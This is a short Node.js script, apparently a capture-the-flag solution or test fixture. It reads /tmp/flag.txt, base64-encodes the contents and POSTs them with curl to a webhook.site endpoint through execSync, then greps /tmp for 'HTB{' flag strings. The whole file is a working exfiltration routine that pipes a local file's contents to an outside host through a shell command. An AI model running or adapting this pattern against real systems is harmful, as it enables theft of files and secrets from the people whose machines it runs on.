const fs = require('fs');
const { execSync } = require('child_process');
const webhook = 'https://webhook.site/fixture-id';
function send(path, data) {
  const encoded = Buffer.from(data).toString('base64');
  execSync(`curl -s -X POST "${webhook}/${path}" -d "${encoded}"`);
}
const flag = fs.readFileSync('/tmp/flag.txt', 'utf8');
send('flag', flag);
execSync('grep -rl "HTB{" /tmp 2>/dev/null');
